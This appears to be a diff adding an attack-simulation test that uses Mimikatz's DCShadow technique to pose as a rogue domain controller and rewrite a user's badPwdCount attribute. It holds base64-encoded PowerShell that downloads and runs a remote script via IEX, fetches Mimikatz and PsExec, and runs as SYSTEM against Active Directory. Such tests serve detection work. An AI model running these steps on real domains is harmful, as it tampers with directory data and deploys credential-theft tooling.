@@ -1,0 +1,57 @@
+- id: f2527079-ae60-53f9-8d8d-c7ccfe0461ac
+  name: Soumaia ART Tests - DCShadow (Active Directory)
+  description: 'Use Mimikatz DCShadow method to simulate behavior of an Active Directory Domain Controller and edit protected attribute.
+
+
+    [DCShadow](https://www.dcshadow.com/)
+
+    [Additional Reference](http://www.labofapenetrationtester.com/2018/04/dcshadow.html)
+
+
+    It will set the badPwdCount attribute of the target user (user/machine account) to 9999. You can check after with:
+
+    Get-ADObject -LDAPFilter ''(samaccountname=<user>)'' -Properties badpwdcount | select-object -ExpandProperty badpwdcount
+
+
+    Need SYSTEM privileges locally (automatically obtained via PsExec, so running as admin is sufficient), and Domain Admin remotely.
+
+    The easiest is to run elevated and as a Domain Admin user. (requires elevation)'
+  tactic: defense-impairment
+  technique:
+    attack_id: T1207
+    name: Rogue Domain Controller
+  platforms:
+    windows:
+      psh:
+        command: |-
+          powershell -NoProfile -EncodedCommand JABtAGkAbQBpAGsAYQB0AHoAXwBwAGEAdABoACAAPQAgAGMAbQBkACAALwBjACAAZQBjAGgAbwAgACQAZQBuAHYAOgBUAEUATQBQAFwAQQBSAFQALQBFAHgAdABlAHIAbgBhAGwAUABhAHkAbABvAGEAZABzAFwAbQBpAG0AaQBrAGEAdAB6AFwAeAA2ADQAXABtAGkAbQBpAGsAYQB0AHoALgBlAHgAZQAKAGkAZgAgACgAVABlAHMAdAAtAFAAYQB0AGgAIAAkAG0AaQBtAGkAawBhAHQAegBfAHAAYQB0AGgAKQAgAHsAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7AGUAeABpAHQAIAAxAH0ACgA=
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand WwBOAGUAdAAuAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0AE0AYQBuAGEAZwBlAHIAXQA6ADoAUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbAAgAD0AIABbAE4AZQB0AC4AUwBlAGMAdQByAGkAdAB5AFAAcgBvAHQAbwBjAG8AbABUAHkAcABlAF0AOgA6AFQAbABzADEAMgAKAEkARQBYACAAKABpAHcAcgAgACIAaAB0AHQAcABzADoALwAvAHIAYQB3AC4AZwBpAHQAaAB1AGIAdQBzAGUAcgBjAG8AbgB0AGUAbgB0AC4AYwBvAG0ALwByAGUAZABjAGEAbgBhAHIAeQBjAG8ALwBpAG4AdgBvAGsAZQAtAGEAdABvAG0AaQBjAHIAZQBkAHQAZQBhAG0ALwBtAGEAcwB0AGUAcgAvAFAAdQBiAGwAaQBjAC8ASQBuAHYAbwBrAGUALQBGAGUAdABjAGgARgByAG8AbQBaAGkAcAAuAHAAcwAxACIAIAAtAFUAcwBlAEIAYQBzAGkAYwBQAGEAcgBzAGkAbgBnACkAIAAKACQAcgBlAGwAZQBhAHMAZQBzACAAPQAgACIAaAB0AHQAcABzADoALwAvAGEAcABpAC4AZwBpAHQAaAB1AGIALgBjAG8AbQAvAHIAZQBwAG8AcwAvAGcAZQBuAHQAaQBsAGsAaQB3AGkALwBtAGkAbQBpAGsAYQB0AHoALwByAGUAbABlAGEAcwBlAHMAIgAKACQAegBpAHAAVQByAGwAIAA9ACAAKABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAkAHIAZQBsAGUAYQBzAGUAcwAgAHwAIABDAG8AbgB2AGUAcgB0AEYAcgBvAG0ALQBKAHMAbwBuACkAWwAwAF0ALgBhAHMAcwBlAHQAcwAuAGIAcgBvAHcAcwBlAHIAXwBkAG8AdwBuAGwAbwBhAGQAXwB1AHIAbAAgAHwAIAB3AGgAZQByAGUALQBvAGIAagBlAGMAdAAgAHsAIAAkAF8ALgBlAG4AZABzAHcAaQB0AGgAKAAiAC4AegBpAHAAIgApACAAfQAKACQAbQBpAG0AaQBrAGEAdAB6AF8AZQB4AGUAIAA9ACAAYwBtAGQAIAAvAGMAIABlAGMAaABvACAAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABtAGkAbQBpAGsAYQB0AHoAXAB4ADYANABcAG0AaQBtAGkAawBhAHQAegAuAGUAeABlAAoAJABiAGEAcwBlAFAAYQB0AGgAIAA9ACAAUwBwAGwAaQB0AC0AUABhAHQAaAAgACQAbQBpAG0AaQBrAGEAdAB6AF8AZQB4AGUAIAB8ACAAUwBwAGwAaQB0AC0AUABhAHQAaAAKAEkAbgB2AG8AawBlAC0ARgBlAHQAYwBoAEYAcgBvAG0AWgBpAHAAIAAkAHoAaQBwAFUAcgBsACAAIgB4ADYANAAvAG0AaQBtAGkAawBhAHQAegAuAGUAeABlACIAIAAkAGIAYQBzAGUAUABhAHQAaAAKAA==
+          }
+          powershell -NoProfile -EncodedCommand aQBmACAAKABUAGUAcwB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABQAFMAVABvAG8AbABzAFwAUABzAEUAeABlAGMALgBlAHgAZQAiACkAIAB7ACAAZQB4AGkAdAAgADAAfQAgAGUAbABzAGUAIAB7ACAAZQB4AGkAdAAgADEAfQAKAA==
+          if ($LASTEXITCODE -ne 0) {
+              powershell -NoProfile -EncodedCommand SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0ACAAIgBoAHQAdABwAHMAOgAvAC8AZABvAHcAbgBsAG8AYQBkAC4AcwB5AHMAaQBuAHQAZQByAG4AYQBsAHMALgBjAG8AbQAvAGYAaQBsAGUAcwAvAFAAUwBUAG8AbwBsAHMALgB6AGkAcAAiACAALQBPAHUAdABGAGkAbABlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFAAcwBUAG8AbwBsAHMALgB6AGkAcAAiAAoARQB4AHAAYQBuAGQALQBBAHIAYwBoAGkAdgBlACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFAAcwBUAG8AbwBsAHMALgB6AGkAcAAiACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFAAcwBUAG8AbwBsAHMAIgAgAC0ARgBvAHIAYwBlAAoATgBlAHcALQBJAHQAZQBtACAALQBJAHQAZQBtAFQAeQBwAGUAIABEAGkAcgBlAGMAdABvAHIAeQAgACgAUwBwAGwAaQB0AC0AUABhAHQAaAAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABQAFMAVABvAG8AbABzAFwAUABzAEUAeABlAGMALgBlAHgAZQAiACkAIAAtAEYAbwByAGMAZQAgAHwAIABPAHUAdAAtAE4AdQBsAGwACgBDAG8AcAB5AC0ASQB0AGUAbQAgACIAJABlAG4AdgA6AFQARQBNAFAAXABBAFIAVAAtAEUAeAB0AGUAcgBuAGEAbABQAGEAeQBsAG8AYQBkAHMAXABQAHMAVABvAG8AbABzAFwAUABzAEUAeABlAGMALgBlAHgAZQAiACAAIgAkAGUAbgB2ADoAVABFAE0AUABcAEEAUgBUAC0ARQB4AHQAZQByAG4AYQBsAFAAYQB5AGwAbwBhAGQAcwBcAFAAUwBUAG8AbwBsAHMAXABQAHMARQB4AGUAYwAuAGUAeABlACIAIAAtAEYAbwByAGMAZQAKAA==
+          }
+          # starting fake DC server, as SYSTEM (required)
+          $dc_output_file = "$env:TEMP\ART-ExternalPayloads\art-T1207-mimikatz-DC.log"
+          Remove-Item $dc_output_file -ErrorAction Ignore
+          $mimikatzParam ="`"log $dc_output_file`" `"lsadump::dcshadow /object:bruce.wayne /attribute:badpwdcount /value:9999`" `"exit`""
+          $dc = Start-Process -FilePath cmd.exe -Verb Runas -ArgumentList "/c '$env:TEMP\ART-ExternalPayloads\PSTools\PsExec.exe' /accepteula -d -s $env:TEMP\ART-ExternalPayloads\mimikatz\x64\mimikatz.exe $mimikatzParam"
+
+          # wait for fake DC server to be ready...
+          Start-Sleep -Seconds 5
+
+          # server ready, so trigger replication (push) and wait until it finished
+          & "$env:TEMP\ART-ExternalPayloads\mimikatz\x64\mimikatz.exe" "lsadump::dcshadow /push" "exit"
+
+          Write-Host "`nWaiting for fake DC server to return"
+          Wait-Process $dc
+
+          Write-Host "`nOutput from fake DC server:"
+          Get-Content $dc_output_file
+          Start-Sleep 1 # wait a little until the file is not locked anymore so we can actually delete it
+          Remove-Item $dc_output_file -ErrorAction Ignore
+
+          Write-Host "End of DCShadow"
+        cleanup: |-
+          Stop-Process -Name "mimikatz" -Force -ErrorAction Ignore
